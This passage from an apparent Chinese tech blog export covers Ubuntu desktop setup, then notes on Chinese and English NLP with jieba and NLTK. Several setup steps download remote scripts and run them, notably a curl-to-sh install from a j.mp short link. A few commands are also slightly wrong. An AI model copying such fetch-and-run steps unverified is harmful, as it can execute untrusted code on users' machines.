Path相互映射（同docker中宿主机与容器的关系） image 配置远程解释器 点击PyCharm的File &gt; Setting &gt; Project &gt; Project Interpreter右边的设置按钮新建一个项目的远程解释器： image image 配置完成。配置完成以后需要等本地和远程的环境同步一下。 本地的文件，修改之后可以随时右键deployment-&gt;upload到远程主机，或者直接在本地调试运行。 docker容器停了以后里面的SSH服务也会相应停止， docker重启时也需要重启ssh服务： 1$ service ssh restart 参考： Docker中搭建深度学习环境","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"Docker","slug":"Tools/Docker","permalink":"https://racleray.github.io/categories/Tools/Docker/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://racleray.github.io/tags/Linux/"},{"name":"Docker","slug":"Docker","permalink":"https://racleray.github.io/tags/Docker/"},{"name":"NVIDIA Container Toolkit","slug":"NVIDIA-Container-Toolkit","permalink":"https://racleray.github.io/tags/NVIDIA-Container-Toolkit/"}]},{"title":"个人Linux环境配置","slug":"个人Linux环境配置","date":"2020-07-06T14:42:23.000Z","updated":"2023-08-07T11:54:31.038Z","comments":true,"path":"posts/2c27ec14.html","link":"","permalink":"https://racleray.github.io/posts/2c27ec14.html","excerpt":"记录个人桌面版Linux配置过程。但是在本机安装双系统很不稳定，虚拟机在我的小破笔记本上也表现很一般，最后还是转战云主机了。","text":"更新源 找到Software &amp; Updates，将源更新为阿里云的源 在Other Software里将Canonical Partners勾上 然后自己手动更新一下： 123sudo apt updatesudo apt upgrade Sougou Pinyin 123456sudo apt-get install fcitx-binsudo apt-get install fcitx-table # 搜狗输入法Linux官网 https://pinyin.sogou.com/linux/ 下载64bit的程序sudo dpkg -i sogoupinyin*.deb 重启 找到Fcitx Configure，设置输入法 截图软件 Shutter 下载libgoocanvas-common、libgoocanvas3、libgoo-canvas-perl 12345sudo dpkg -i libgoocanvas-common*.debsudo dpkg -i libgoocanvas3*.debsudo dpkg -i libgoo-canvas-perl*deb 将上述三个包给安装上，若安装失败，执行下面代码: 1sudo apt-get install -f 然后再安装这几个包 视频和音频 安装解码器： 1sudo apt-get install ubuntu-restricted-extras 安装VLC视频播放器 1sudo apt-get install vlc browser-plugin-vlc 安装FFmpeg 1sudo apt-get install ffmpeg 网易云音乐 官网 设置: 点击图标最小化 1gsettings set org.gnome.shell.extensions.dash-to-dock click-action 'minimize' 美化 123456789sudo apt-get install gnome-tweak-tool #安装tweaksudo apt-get install gnome-shell-extensions -y #安装shell扩展sudo apt install chrome-gnome-shell #为了能在浏览器内安装gnome插件，火狐和谷歌都能用sudo apt-get install gtk2-engines-pixbuf #防止GTK2错误sudo apt install libxml2-utils 从gnome-look这里下载，或者通过pling和 ocs-url直接安装 或者手动下载下来，接下来解压到指定文件夹，并安装他们。 1234567xz -d Gnome-OSC-HS-light-menu*.tar.xztar -xvf Gnome-OSC-HS-light-menu*.tar -C /usr/share/themes/xz -d Gnome-OSC-HS--2*.tar.xztar -xvf Gnome-OSC-HS--2*.tar -C /usr/share/themes/ 图标：/usr/share/icons/ 其他主题：/usr/share/themes/ 如果Shell显示不可修改， 1sudo apt install gnome-shell-extensions 安装压缩软件 1sudo apt-get install p7zip-full p7zip-rar rar unzip Chrome Brower 123wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.debsudo dpkg -i google-chrome*; sudo apt-get -f install 安装多版本gcc和g++，并共存 1234567891011121314151617181920212223sudo apt-get install gcc-5 gcc-5-multilibsudo apt-get install g++-5 g++-5-multilibsudo apt-get install gcc-6 gcc-6-multilibsudo apt-get install g++-6 g++-6-multilibsudo apt-get install gcc-7 gcc-7-multilibsudo apt-get install g++-7 g++-7-multilibsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 50sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-6 60sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-7 70sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-5 50sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-6 60sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-7 70 然后选择gcc和g++版本 123sudo update-alternatives --config gccsudo update-alternatives --config g++ CMAKE https://cmake.org/download/ 安装在/opt下，软连接到/usr/bin/ 1sudo ln -sf /opt/cmake-3.17.1/bin/* /usr/bin/ complete cmake process with following libs:(boost版本较低，需要手动安装较高版本，见下文Boost部分) 1sudo apt-get install cmake libblkid-dev e2fslibs-dev libboost-all-dev libaudit-dev openSSL 1sudo apt install libssl-dev 编写简单的cmake https://cmake.org/cmake/help/v3.17/guide/tutorial/index.html 使用cmake首先得有个CMakeList.txt文件，你需要把配置信息写在该文件中，然后通过cmake去处理该文件。 将设有下面一个main.cpp文件 1234567//main.cpp文件\\#include&lt;iostream&gt;using namespace std;int main()&#123;cout&lt;&lt;\"hello world!\"&lt;&lt;endl;return 0;&#125; 这时候我们就可以写个如下的CMakeList.txt文件 1234567891011\\#cmake最小需要版本cmake_minimum_required(VERSION 2.8)\\#项目名字project(HELLOWORLD)\\#包含原程序,即把给定目录下的源程序复制给变量DIR_SRCaux_source_directory(DIR_SRC ./)\\#生成程序add_executable(helloworld $&#123;DIR_SRC&#125;) 然后执行如下命令 12345mkdir buildcd buildcmake ..make./helloworld 这样就编译好程序并运行。 添加静态库或者动态库 而假设我们程序用到了在/usr/lib下的一个静态库libmy.a，那就需要添加如下两个命令 12345\\#库所在位置link_directories(/usr/lib)\\#程序编译时候链接库target_link_libraries(helloworld my) Boost 下载https://www.boost.org/users/history/version_1_72_0.html 1sudo tar -zxvf boost_1_72_0.tar.gz -C /usr/local/ Boost库的编译安装还有一些依赖库，需要先安装 1sudo apt-get install mpi-default-dev libicu-dev python-dev libbz2-dev 回到boost库的路径下，运行如下命令 12sudo ./bootstrap.shsudo ./b2 install --prefix=/usr --build-dir=tmp/build-boost --prefix后面跟的是你安装boost库的路径，安装完成后所有的头文件和lib库都会保存在这个路径下 若 ./b2不加 install --prefix=/usr 会编译到当前文件夹下，安装没有链接成功，因此手动链接。 12sudo ln -sf /usr/local/boost_1_72_0/boost/* /usr/include/boost/include/sudo ln -sf /usr/local/boost_1_72_0/stage/lib/* /usr/include/boost/lib/ 然后加入环境变量/etc/profile 1export env=$PATH:/usr/include/boost 只是用头文件示例程序 不需要先编译boost，直接引入头文件就行。 这个程序用到了boost提供的正则匹配库 123456789101112131415161718#include &lt;boost/regex.hpp&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123; std::string line; boost::regex pat(\"tcp:*\"); while(std::cin) &#123; std::getline(std::cin, line); boost::smatch matches; if(boost::regex_match(line, matches, pat)) std::cout &lt;&lt; matches[0] &lt;&lt; std::endl; &#125;&#125; 依旧通过CMake进行编译 首先设置Boost库的路径，也就是之前的安装路径 然后使用find_package来搜索这个路径下面是否有需要的regex库 最后设置头文件搜索路径以及把找到的库link到应用程序 1234567891011121314project(tutorial-0)cmake_minimum_required(VERSION 3.5)set(CMAKE_CXX_STANDARD 14)set(BOOST_ROOT /usr/local/boost_1_72_0)find_package(Boost COMPONENTS regex REQUIRED)if(Boost_FOUND) include_directories($&#123;Boost_INCLUDE_DIRS&#125;) add_executable(foo foo.cpp) target_link_libraries (foo $&#123;Boost_LIBRARIES&#125;)endif() 编译完成后运行app查看结果 多版本python和pip共存 ubuntu18.04自带python3，但是没有python2，pip2，pip3 12345678910111213141516171819202122232425sudo apt install curlsudo apt-get install python3-distutilssudo apt-get install python3-testresourcessudo apt-get install python3-widgetsnbextensionsudo apt install python-minimalsudo apt install python2.7curl https://bootstrap.pypa.io/get-pip.py -o get-pip.pysudo python3 get-pip.py #安装pip3sudo python2 get-pip.py #安装pip3sudo pip3 install --upgrade pip #升级pip3sudo pip2 install --upgrade pip #升级pip2# 此时pip和python并不知道指向2还是3，需要自己修改。我们使用alias来设置别名vim /etc/profile # 所有用户 。修改~/.bashrc或者.profile只会修改当前用户# 写入 alias pip=/usr/local/bin/pip3.6 alias python=/usr/bin/python3.6source /etc/profile VS Code 微软官网下载deb安装即可 Git 1sudo apt install git 有道词典 官网下载安装即可 typora 官网打包的二进制 Typora 在 Ubuntu (gnome) 上安装为应用程序（可被选择为默认程序） 12345678910111213141516171819202122$ cd Downloads/Software$ wget https://typora.io/linux/Typora-linux-x64.tar.gz$ tar -xzvf Typora-linux-x64.tar.gz$$ sudo mv Typora-linux-x64 /opt/$ $ cd /opt/Typora-linux-x64/$ ./Typora # test could run ?$ cd /usr/share/applications/Typora.desktop$ sudo vim Typora.desktop[Desktop Entry]Name=TyporaGenericName=EditorComment=Typroa - a markdown editorExec=\"/opt/Typora-linux-x64/Typora\" %UIcon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_256x256.pngTerminal=falseCategories=Markdown;StartupNotify=falseType=Application sublime-text https://www.sublimetext.com/docs/3/linux_repositories.html#apt jetbrains https://www.jetbrains.com/toolbox-app/ Terminator 新的shell界面 常用快捷键 快捷键 作用 Ctrl+Shift+E 垂直分割窗口 Ctrl+Shift+O 水平分割窗口 Ctrl+Shift+W 关闭当前窗格 Ctrl+Shift+C 复制 Ctrl+Shift+V 粘贴 Ctrl+Shift+X 放大或缩小某一窗口 Ctrl+Shift+Z 从放大窗口回到多窗格界面 ALT+↑[↓,←,→] 移动到上[下、左、右]面一个窗口 Ctrl+Tab 切换窗口 Ctrl+- 缩小字体 Ctrl+Shift+=也就是Ctrl++ 放大字体 Zsh fish 使用oh-my-zsh来自动管理配置，可以查看官网：https://ohmyz.sh/ zsh官方的antigen来管理 https://github.com/zsh-users/antigen 1234567sudo apt install zsh# 切换到zshchsh -s /bin/zsh curl -L git.io/antigen &gt; antigen.zsh # 或者直接在git.io/antigen下载文本# or use git.io/antigen-nightly for the latest version# or apt-get install zsh-antigen 在 ~/.zshrc 中添加下面的内容 1234567891011121314151617181920212223242526272829source ~/antigen.zsh# Load the oh-my-zsh's library.antigen use oh-my-zsh# Bundles from the default repo (robbyrussell's oh-my-zsh).antigen bundle brewantigen bundle command-not-foundantigen bundle dockerantigen bundle docker-composeantigen bundle gemantigen bundle gitantigen bundle golangantigen bundle ngantigen bundle osxantigen bundle pip# Syntax highlighting bundle.antigen bundle zsh-users/zsh-syntax-highlightingantigen bundle zsh-users/zsh-completionsantigen bundle zsh-users/zsh-autosuggestionsantigen bundle zsh-users/zsh-apple-touchbar# Load the theme.# antigen theme robbyrussellantigen theme https://github.com/denysdovhan/spaceship-prompt spaceship# Tell Antigen that you're done.antigen apply 进入zsh 乱码问题 1234git clone https://github.com/powerline/fonts.git# installcd fonts./install.sh 在优化中设置等宽字体为powerline类型字体中的一个 其他选择：fish https://link.zhihu.com/?target=https%3A//wiki.archlinux.org/index.php/Fish TLDR https://tldr.sh/：常用命令范式查找工具 文件查找 find locate fd：fd is a simple, fast and user-friendly alternative to find. 代码查找 重要的是：有些问题使用合适的工具就会迎刃而解，而具体选择哪个工具则不是那么重要 grep ack, ag 和 rg 查找Shell历史 Ctrl+R 对命令历史记录进行回溯搜索 文件夹导航 fasd：查找最常用和/或最近使用的文件和目录 概览目录结构，例如 tree, broot 更完整的文件管理器，例如 nnn 或 ranger npm 1234567sudo apt-get install nodejssudo apt-get install npmnpm -vnpm config set registry https://registry.npm.taobao.org 安装nrm工具，用于管理软件源。 123$ sudo npm install -g nrm$ nrm ls 在特定网络环境下需要配置代理的话，可以使用如下命令配置。 123$ npm config set proxy http://127.0.0.1:3128$ npm config set http-proxy http://127.0.0.1:3128$ npm config set https-proxy https://127.0.0.1:3128 vim 安装VIM 1apt-get install vim https://spacevim.org/documentation/：spacevim插件集合 or https://github.com/spf13/spf13-vim：一键配置插件集合 http://vim.spf13.com/#install 1curl https://j.mp/spf13-vim3 -L &gt; spf13-vim.sh &amp;&amp; sh spf13-vim.sh - tmux Ubuntu并不自带tmux，所以我们需要输入以下指令进行安装： 按下 Ctrl + d 或者直接在命令行输入 exit 指令，就可以退出Tmux窗口。 Tmux窗口有很多的快捷键，所有的快捷键都需要前缀键。默认的前缀键是 Ctrl + b，只有先按下 Ctrl + b，快捷键才能生效。举例来说，帮助指令的快捷键是 Ctrl + b ?。那么在Tmux窗口下，先按下 Ctrl + b，再按下 ?，就能显示帮助信息。 tmux重要指令的总结： tmux new -s 新建一个特定名称的会话 tmux detach 将当前会话与窗口分离 tmux ls / tmux list-session 查看当前所有的Tmux会话 tmux attach -t 重新连接某个已存在的会话 tmux kill-session -t 删除某个会话 tmux switch -t 切换会话 tmux rename-session -t 重新命名会话 会话相关的快捷键： Ctrl + b d 分离会话 Ctrl + b s 列出所有会话 Ctrl + b $ 重命名当前会话 Tmux可以在一个窗口中分出多个窗格 (pane)，每个窗格可以运行不同的指令。以下是相关快捷键： Ctrl+b % 划分左右两个窗格 Ctrl+b “ 划分上下两个窗格 Ctrl+b 切换到其他窗格，指向切换的方向 Ctrl+b ; 切换到上一个窗格 Ctrl+b o 切换到下一个窗格 Ctrl+b { 当前窗格左移 Ctrl+b } 当前窗格右移 Ctrl+b x 关闭当前窗格 - 代码折叠 zc 关闭当前打开的折叠 zo 打开当前的折叠 zm 关闭所有折叠 zM 关闭所有折叠及其嵌套的折叠 zr 打开所有折叠 zR 打开所有折叠及其嵌套的折叠 zd 删除当前折叠 zE 删除所有折叠 zj 移动至下一个折叠 zk 移动至上一个折叠 zn 禁用折叠 zN 启用折叠 SimpleScreenRecorder 1sudo apt-get install simplescreenrecorder Dumb downloader that scrapes the web : tget is wget for torrents Unity Tweak 工具 1sudo apt-get install unity-tweak-tool 使用 parcellite剪切板 12$ sudo apt-get install parcellite$ parcellite 设置登录背景 假设我现在用的图片是mypicture.jpg , 将它移动到/usr/share/backgrounds/目录下 1sudo mv currentdir&#x2F;mypicture.jpg &#x2F;usr&#x2F;share&#x2F;backgrounds&#x2F; Ubuntu现在用的Gnome的桌面，和以前Unity时候的配置文件不一样，所以16.04的教程是用不了的，18.04登录背景相关的配置是用css的：/etc/alternatives/gdm3.css 1sudo gedit /etc/alternatives/gdm3.css 123456789101112#找到默认的这个部分#lockDialogGroup &#123; background: #2c001e url(resource:///org/gnome/shell/theme/noise-texture.png); background-repeat: repeat; &#125;#改为#lockDialogGroup &#123; background: #2c001e url(file:///usr/share/backgrounds/mypicture.jpg); background-repeat: no-repeat; background-size: cover; background-position: center; &#125; 保存并重启. apt-get使用 apt-get命令本身并不具有管理软件包功能，只是提供了一个软件包管理的命令行平台。 apt-get命令的一般语法格式为： apt-get subcommands [ -d | -f | -m | -q | --purge | --reinstall | - b | - s | - y | - u | - h | -v ] [pkg] apt-cache提供了搜索功能。 更新或升级操作： apt-get update # 更新源 apt-get upgrade # 更新所有已安装的包 apt-get dist-upgrade # 发行版升级（如，从10.10到11.04） 安装或重装类操作： apt-get install # 安装软件包，多个软件包用空格隔开 apt-get install --reinstall # 重新安装软件包 apt-get install -f # 修复安装（破损的依赖关系）软件包 卸载类操作： apt-get remove # 删除软件包（不包括配置文件） apt-get purge # 删除软件包（包括配置文件） 下载清除类操作： apt-get source # 下载pkg包的源代码到当前目录 apt-get download # 下载pkg包的二进制包到当前目录 apt-get source -d # 下载完源码包后，编译 apt-get build-dep # 构建pkg源码包的依赖环境（编译环境？） apt-get clean # 清除缓存(/var/cache/apt/archives/{,partial}下)中所有已下载的包 apt-get autoclean # 类似于clean，但清除的是缓存中过期的包（即已不能下载或者是无用的包） apt-get autoremove # 删除因安装软件自动安装的依赖，而现在不需要的依赖包 查询类操作： apt-cache stats # 显示系统软件包的统计信息 apt-cache search # 使用关键字pkg搜索软件包 apt-cache show # 显示软件包pkg_name的详细信息 apt-cache depends # 查看pkg所依赖的软件包 apt-cache rdepends # 查看pkg被那些软件包所依赖 关于软件安装目录的说明： 一般的deb包(包括新立得或者apt-get下载的)都在/usr/share。 自己下载的压缩包或者编译的包，有些可以选择安装目录，一般放在/usr/local/，也有在/opt的。 关于apt-get的缓存目录： 默认的缓存目录是/var/cache/apt/archives/ 为日后重装系统后安装软件节省下载时间或者将软件包给别人用 参考链接： Ubuntu18.04安装后应该做的事 Linux玩家必备：Ubuntu完全配置指南 Ubuntu 18.04配置及美化","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"Linux","slug":"Tools/Linux","permalink":"https://racleray.github.io/categories/Tools/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://racleray.github.io/tags/Linux/"}]},{"title":"中文文本处理","slug":"中文文本处理","date":"2020-07-06T13:40:16.000Z","updated":"2023-08-07T11:54:31.038Z","comments":true,"path":"posts/b75580e5.html","link":"","permalink":"https://racleray.github.io/posts/b75580e5.html","excerpt":"简要记录一点中文文本处理的概念和工具使用。","text":"中文文本基本任务与处理 1.分词 中文和日文单纯从文本形态上无法区分具备独立含义的词（拉丁语系纯天然由空格分隔不同的word）。因此在很多中文任务中，我们需要做的第一个处理叫做分词。 ​ 主流的分词方法主要是基于词典匹配的分词方法(正向最大匹配法、逆向最大匹配法和双向匹配分词法等)和基于统计的分词方法(HMM、CRF、和深度学习)；‘ ​ 主流的分词工具库包括 中科院计算所NLPIR、哈工大LTP、清华大学THULAC、Hanlp分词器、Python jieba工具库等。 最大匹配法 ​ 最大匹配是指以词典为依据，取词典中最长单词为第一个次取字数量的扫描串，在词典中进行扫描（为提升扫描效率，还可以跟据字数多少设计多个字典，然后根据字数分别从不同字典中进行扫描）。 ​ 双向最大匹配法：正向最大匹配和逆向最大匹配两种算法都切一遍，然后根据大颗粒度词越多越好，非词典词和单字词越少越好的原则，选取其中一种分词结果输出。 “我们在野生动物园玩” ​ - 正向最大匹配法：“我们/在野/生动/物/园/玩”，其中，单字字典词为2，非词典词为1。 ​ - 逆向最大匹配法：“我们/在/野生动物园/玩”，其中，单字字典词为2，非词典词为0。 ​ 非字典词：正向(1)&gt;逆向(0)（越少越好） ​ 单字字典词：正向(2)=逆向(2)（越少越好） ​ 总词数：正向(6)&gt;逆向(4)（越少越好） 因此最终输出为逆向结果。 2.去停用词与N-gram ​ 同英文 3.词性标注 ​ 词性标注（part-of-speech tagging）,又称为词类标注或者简称标注，是指为分词结果中的每个单词标注一个正确的词性。 ​ 在汉语中，词性标注比较简单，因为汉语词汇词性多变的情况比较少见，大多词语只有一个词性，或者出现频次最高的词性远远高于第二位的词性。 4.句法依存分析 ​ 依存句法分析(Dependency Parsing, DP) 识别句子中的“主谓宾”、“定状补”这些语法成分，并分析各成分之间的关系。 image ​ 依存句法分析标注关系(共14种) 及含义如下(哈工大开源包使用)： 关系类型 Tag Description Example 主谓关系 SBV subject-verb 我送她一束花(我&lt;–送) 动宾关系 VOB 直接宾语，verb-object 我送她一束花(送–&gt; 花) 间宾关系 IOB 间接宾语，indirect-object 我送她一束花(送–&gt; 她) 前置宾语 FOB 前置宾语，fronting-object 他什么书都读(书&lt;–读) 兼语 DBL double 他请我吃饭(请–&gt; 我) 定中关系 ATT attribute 红苹果(红&lt;–苹果) 状中结构 ADV adverbial 非常美丽(非常&lt;–美丽) 动补结构 CMP complement 做完了作业(做–&gt; 完) 并列关系 COO coordinate 大山和大海(大山–&gt; 大海) 介宾关系 POB preposition-object 在贸易区内(在–&gt; 内) 左附加关系 LAD left adjunct 大山和大海(和&lt;–大海) 右附加关系 RAD right adjunct 孩子们(孩子–&gt; 们) 独立结构 IS independent structure 两个单句在结构上彼此独立 核心关系 HED head 指整个句子的核心 5.语义依存分析 ​ Semantic Dependency Parsing, SDP，分析句子各个语言单位间的语义关联。 ​ 使用语义依存刻画句子语义，好处在于不需要去抽象词汇本身，而是通过词汇所承受的语义框架来描述该词汇。 ​ 语义依存分析目标是跨越句子表层句法结构的束缚，直接获取深层的语义信息。 ​ 例如以下三个句子，用不同的表达方式表达了同一个语义信息，即张三实施了一个吃的动作，吃的动作是对苹果实施的。 image ​ 语义依存分析不受句法结构的影响，将具有直接语义关联的语言单元直接连接依存弧并标记上相应的语义关系。 ​ 语义依存关系分为三类，分别是 主要语义角色，每一种语义角色对应存在一个嵌套关系和反关系； 事件关系，描述两个事件间的关系； 语义依附标记，标记说话者语气等依附性信息。 ​ http://ltp.ai/demo.html，http://ltp.ai/docs/index.html：哈工大开源包网站 6.语法解析 ​ 句子可以用主语、谓语、宾语来表示。在自然语言的处理过程中，有许多应用场景都需要考虑句子的语法，因此研究语法解析变得非常重要。 ​ 语法解析有两个主要的问题，其一是句子语法在计算机中的表达与存储方法，以及语料数据集；其二是语法解析的算法。 表达与存储 ​ 用树状结构图来表示 image ​ NP、VP、PP是名词、动词、介词短语（短语级别）；N、V、P分别是名词、动词、介词。 语法解析的算法 上下文无关语法（Context-Free Grammer） ​ 为了生成句子的语法树，我们可以定义如下的一套上下文无关语法。 •1）N表示一组非叶子节点的标注，例如{S、NP、VP、N...} •2）Σ表示一组叶子结点的标注，例如{我们、尊敬...} •3）R表示一组规则，每条规则可以表示为 •4）S表示语法树开始的标注 ​ 当给定一个句子时，我们便可以按照从左到右的顺序来解析语法。 ​ 例如，句子the man sleeps就可以表示为(S (NP (DT the) (NN man)) (VP sleeps))。 ​ 规则R示例如下： S -&gt; NP VP VP -&gt; V NP | V NP PP PP -&gt; P NP V -&gt; \"saw\" | \"ate\" NP -&gt; \"John\" | \"Mary\" | \"Bob\" | Det N | Det N PP Det -&gt; \"a\" | \"an\" | \"the\" | \"my\" N -&gt; \"dog\" | \"cat\" | \"cookie\" | \"park\" P -&gt; \"in\" | \"on\" | \"by\" | \"with\" 概率分布的上下文无关语法（Probabilistic Context-Free Grammar） ​ 上下文无关的语法可以很容易的推导出一个句子的语法结构，但是缺点是推导出的结构可能存在二义性。 ​ 由于语法的解析存在二义性，我们就需要找到一种方法从多种可能的语法树种找出最可能的一棵树。 ​ 一种常见的方法既是PCFG （Probabilistic Context-Free Grammar）。除了常规的语法规则以外，我们还对每一条规则赋予了一个概率。对于每一棵生成的语法树，我们将其中所有规则的概率的乘积作为语法树的出现概率。 ​ 分别计算每颗语法树的概率p(t)，出现概率最大的那颗语法树就是我们希望得到的结果，即argmax p(t)。 ​ 训练算法： 算法依赖于CFG中对于N、Σ、R、S的定义以及PCFG中的p(x)。 统计出语料库中所有的N和Σ 利用语料库中的所有规则作为R 针对每个规则A -&gt; B，从语料库中估算p(x) = p(A -&gt; B) / p(A) ​ 在CFG的定义的基础上，重新定义一种叫Chomsky的语法格式。这种格式要求每条规则只能是X -&gt; Y1 Y2或者X -&gt; Y的格式。实际上Chomsky语法格式保证生产的语法树总是二叉树的格式，同时任意一棵语法树总是能够转化成Chomsky语法格式。 ​ 语法树预测算法： 输入一个句子x1, x2, ... , xn时，计算句子对应的语法树有两种方法： 第一种方法是暴力遍历的方法，每个单词x可能有m = len(N)种取值，句子长度是n，每种情况至少存在n个规则，所以在时间复杂度\\(O(mn^2)\\)的情况下，我们可以判断出所有可能的语法树并计算出最佳的那个。 第二种方法当然是动态规划，我们定义w[i, j, X]是第i个单词至第j个单词由标注X来表示的最大概率。w[i, j, PP]代表的是继续往上一层递归时，只选择当前概率最大的组合方式。 ​ 缺点： ​ PCFG也有一些缺点，例如：1）缺乏词法信息；2）连续短语（如名词、介词）的处理等。但总体来讲它给语法解析提供了一种非常有效的实现方法。 7.命名实体识别 ​ 从一段非结构化文本中找出相关实体（triplet中的主词和宾词），并标注出其位置以及类型，它是NLP领域中一些复杂任务（如关系抽取、信息检索、知识问答、知识图谱等）的基础。 关键词抽取 ​ 文本关键词抽取，是对文本信息进行高度凝练的一种有效手段，通过3-5个词语准确概括文本的主题，帮助读者快速理解文本信息。是文本检索、文本摘要等许多下游文本挖掘任务的基础性和必要性的工作。 jieba 基本分词函数与用法 ​ jieba.cut 以及 jieba.cut_for_search 返回的结构都是一个可迭代的 generator。 ​ jieba.lcut以及jieba.lcut_for_search直接返回 list 添加用户自定义字典 1.可以用jieba.load_userdict(file_name)加载用户字典 2.少量的词汇可以自己用下面方法手动添加： 用 add_word(word, freq=None, tag=None) 和 del_word(word) 在程序中动态修改词典用 suggest_freq(segment, tune=True) 可调节单个词语的词频，使其能（或不能）被分出来。 词性标注 123import jieba.posseg as pseg # .posseg模块words = pseg.cut() 关键词抽取 基于 TF-IDF 算法的关键词抽取 import jieba.analyse jieba.analyse.extract_tags(sentence, topK=20, withWeight=False, allowPOS=()) sentence 为待提取的文本 topK 为返回几个 TF/IDF 权重最大的关键词，默认值为 20 withWeight 为是否一并返回关键词权重值，默认值为 False allowPOS 仅包括指定词性的词，默认值为空，即不筛选 自定义逆向文件频率（IDF）文本语料库 用法： jieba.analyse.set_idf_path(file_name) # file_name为自定义语料库的路径 自定义语料库示例见这里 用法示例见这里 自定义停止词（Stop Words）文本语料库 用法： jieba.analyse.set_stop_words(file_name) # file_name为自定义语料库的路径 自定义语料库示例见这里 用法示例见这里 关键词一并返回关键词权重值示例 用法示例见这里 基于 TextRank 算法的关键词抽取 jieba.analyse.textrank(sentence, topK=20, withWeight=False, allowPOS=('ns', 'n', 'vn', 'v')) 直接使用，接口相同，注意默认过滤词性。 jieba.analyse.TextRank() 新建自定义 TextRank 实例 算法论文： TextRank: Bringing Order into Texts 基本思想: 将待抽取关键词的文本进行分词 以固定窗口大小(默认为5，通过span属性调整)，词之间的共现关系，构建图 计算图中节点的PageRank，注意是无向带权图 详解见textrank 123import jieba.analyse as analyseanalyse.textrank(lines, topK=20, withWeight=False, allowPOS=('ns', 'n')) 示例 1234567891011import jieba.analyse as analyseimport pandas as pddf = pd.read_csv(\"./data/file.csv\", encoding='utf-8')df = df.dropna()lines=df.content.values.tolist()content = \"\".join(lines) # 一行输入print(analyse.textrank(content, topK=20, withWeight=False, allowPOS=('ns', 'n', 'vn', 'v')))print(\"-------------------------------------\")print(analyse.textrank(content, topK=20, withWeight=False, allowPOS=('ns', 'n')))","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"chinese process","slug":"chinese-process","permalink":"https://racleray.github.io/tags/chinese-process/"},{"name":"basic","slug":"basic","permalink":"https://racleray.github.io/tags/basic/"}]},{"title":"英文文本处理","slug":"英文文本处理","date":"2020-07-06T13:12:08.000Z","updated":"2023-08-07T11:54:31.048Z","comments":true,"path":"posts/80c1e4ba.html","link":"","permalink":"https://racleray.github.io/posts/80c1e4ba.html","excerpt":"记录英文文本处理的常见概念，以及nltk与SpaCy的简单了解。","text":"英文文本处理 ​ 结合nltk包进行说明。 1 Tokenization(标记化/分词) ​ 文本是不能成段送入模型中进行分析的，我们通常会把文本切成有独立含义的字、词或者短语，这个过程叫做tokenization，这通常是大家解决自然语言处理问题的第一步。 ​ NLTK中提供了2种不同方式的tokenization： sentence tokenization 和 word tokenization，前者把文本进行“断句”，后者对文本进行“分词”。 ​ sentence tokenization相比于split的优势在于，是别不是句号的位置，如：Mr.H 1from nltk import word_tokenize, sent_tokenize 2 去停用词 ​ 在自然语言处理的一些任务中，我们处理的主体“文本”中有一些功能词经常出现，然而对于最后的任务目标并没有帮助，甚至会对结果产生干扰，我们把这类词叫做停用词。 123456nltk.download('stopwords')# 导入内置停用词from nltk.corpus import stopwordsstop_words = stopwords.words('english') 3 词性标注（part-of-speech tagging） ​ 词性（part-of-speech）是词汇基本的语法属性，通常也称为词性。 ​ 词性标注是很多NLP任务的预处理步骤，如句法分析，经过词性标注后的文本会带来很大的便利性，但也不是不可或缺的步骤。 ​ 主流的做法可以分为基于规则和基于统计的方法，包括： 基于最大熵的词性标注 基于统计最大概率输出词性 基于HMM的词性标注 123456nltk.download('averaged_perceptron_tagger')# 词性标注from nltk import pos_tagtags = pos_tag(filtered_corpus)tags[:20] 4 chunking/组块分析 ​ chunking分块是命名实体识别的基础，词性给出来的句子成分的属性，但有时候，更多的信息(比如句子句法结构)可以帮助我们对句子中的模式挖掘更充分。 123456789101112131415161718192021222324from nltk.chunk import RegexpParser # RegexpParserfrom nltk import sent_tokenize,word_tokenize# 写一个匹配名词的模式# JJ adjective; NN noun, singular or mass# CC coordinating conjunctionpattern = \"\"\" NP: &#123;&lt;JJ&gt;*&lt;NN&gt;+&#125; &#123;&lt;JJ&gt;*&lt;NN&gt;&lt;CC&gt;*&lt;NN&gt;+&#125; \"\"\" # 定义组块分析器chunker = RegexpParser(pattern)# 分句tokenized_sentence = nltk.sent_tokenize(text)# 分词tokenized_words = [nltk.word_tokenize(sentence) for sentence in tokenized_sentence]# 词性标注tagged_words = [nltk.pos_tag(word) for word in tokenized_words]# 识别组块word_tree = [chunker.parse(word) for word in tagged_words]word_tree[0].draw() # 绘图 5 命名实体识别（Named Entity Recognition，NER） ​ 命名实体识别包括两部分：1) 实体边界识别；2) 确定实体类别（人名、地名、机构名或其他）。 ​ stanford core nlp modules 速度更快，而且有更高的识别准确度。 1234from nltk import ne_chunk, pos_tag, word_tokenizesentence = \"John studies at Stanford University.\"print(ne_chunk(pos_tag(word_tokenize(sentence)))) 6 Stemming和Lemmatizing 词干算法 和 词型还原 ​ 对英文当中的时态语态等做归一化。 ​ Stemmer 12345678910111213141516171819from nltk.stem import PorterStemmerstemmer = PorterStemmer()stemmer.stem(\"running\")# Out: 'run'from nltk.stem import SnowballStemmerstemmer2 = SnowballStemmer(\"english\")stemmer2.stem(\"growing\")# Out: 'grow'# Create your own stemmer using Regular Expressionfrom nltk.stem import RegexpStemmerrst = RegexpStemmer(r'ing$|s$|e$|able$')rst.stem('controllable')# Out: 'controll' ​ Lemmatization和Stemmer很类似，不同的地方在于Lemmatization会根据语言词根找到原型，而Stemmer只是根据规则截断结尾的 -ing 等后缀。Stemmer的速度更快，但是它通常只是一系列的规则。 12345678910111213from nltk.stem import 